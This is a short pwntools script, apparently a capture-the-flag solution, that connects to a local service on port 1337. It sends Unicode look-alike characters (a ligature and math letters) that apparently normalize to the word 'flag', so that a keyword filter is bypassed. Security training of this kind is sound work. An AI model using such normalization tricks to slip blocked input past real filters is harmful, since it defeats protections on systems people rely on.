from pwn import *

p = remote("localhost", 1337)

p.sendline((4 * "ﬂ𝖺𝗀").encode())
p.interactive()